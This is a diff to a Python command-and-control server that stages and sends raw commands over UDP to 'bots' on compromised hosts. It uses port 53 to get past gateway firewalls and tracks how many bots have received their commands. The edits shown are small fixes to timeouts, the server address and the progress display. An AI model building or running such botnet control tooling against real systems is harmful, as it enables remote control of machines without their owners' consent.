@@ -21,13 +21,13 @@ RESPONSE_BYTE = b'\x03'
 KEEP_ALIVE_BYTE = b'\x04'
 RAW_COMMAND = MAGIC_BYTES + b'\x02\x01'
 
-SERVER_ADDRESS = ('192.168.214.148', 1337)
+SERVER_ADDRESS = ('192.168.214.153', 1337)
 TARGET_PORT = 53 # Only used to get past gateway firewalls
 
 def socket_listen(targets, pipe, stagePercent, targetsWithCommandsStill):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(SERVER_ADDRESS)
-    sock.settimeout(.01)
+    sock.settimeout(.1)
     target_cmds = {}
     target_responses = {}
     while True:
@@ -46,7 +46,6 @@ def socket_listen(targets, pipe, stagePercent, targetsWithCommandsStill):
                             length = len(cmd).to_bytes(2, byteorder='big')
                             packet = MAGIC_BYTES + RAW_COMMAND_BYTE + b'\x01' + b'\x00\x00\x00\x00' + target_address + length + cmd
                             sock.sendto(packet, (tar, TARGET_PORT))
-                    numInStage = len(target_cmds.keys())
             continue
         except:
             continue
@@ -133,7 +132,7 @@ if __name__ == '__main__':
     discovered_targets = manager.list()
     targetsWithStagedCommands = manager.list()
     targetsInthisStage = 0
-    percentOfStageLeft = manager.Value('f', 100)
+    percentOfStageLeft = manager.Value('f', 0)
 
     executeCommands = {}
     responses = {}
@@ -229,13 +228,20 @@ if __name__ == '__main__':
 
     def info(numInStage):
         previous = 0
+        if numInStage == 0:
+            yield 
+            return
+        if percentOfStageLeft.value == numInStage:
+            for i in range(numInStage-1):
+                yield 1
+            yield
+            return
         while percentOfStageLeft.value < numInStage:
             if percentOfStageLeft.value != previous:
                 previous = percentOfStageLeft.value
                 yield percentOfStageLeft.value
             if cancel_view[0]:
                 break
-
 
     try:
         while 1:
@@ -260,8 +266,8 @@ if __name__ == '__main__':
                 with patch_stdout():
                     with ProgressBar(key_bindings=kb, bottom_toolbar=progress_bottom_bar) as pb:
                         for i in pb(info(targetsInthisStage), label='Commands Recieved by Bots', total=targetsInthisStage):
-                            sleep(0.01)
-                if percentOfStageLeft.value*100 >= 100:
+                            sleep(0.1)
+                if percentOfStageLeft.value >= targetsInthisStage:
                     print('All hosts have retrieved their commands')
             elif 'show groups' in user_input:
                 print(f'Groups: {groups}')
@@ -363,8 +369,8 @@ if __name__ == '__main__':
                                 try:
                                     executeCommands[exec_target] += stagedCommands[stage]['commands']
                                 except KeyError:
-                                    print(f'Cannot stage command for {target}, it has not called back.')
-                                
+                                    print(f'Cannot stage command for {exec_target}, it has not called back.')
+
                 percentOfStageLeft.value = 0
                 targetsWithStagedCommands = list(executeCommands.keys())
                 targetsInthisStage = len(executeCommands.keys())
@@ -409,7 +415,7 @@ if __name__ == '__main__':
                 with open('commandData', 'wb') as fi:
                     pickle.dump(stagedCommands, fi)
                 with open('groupData', 'wb') as fi:
-                    pickle.dump(groups, fi)    
+                    pickle.dump(groups, fi)
             elif 'load' in user_input:
                 with open('commandData', 'rb') as fi:
                     stagedCommands.update(pickle.load(fi))
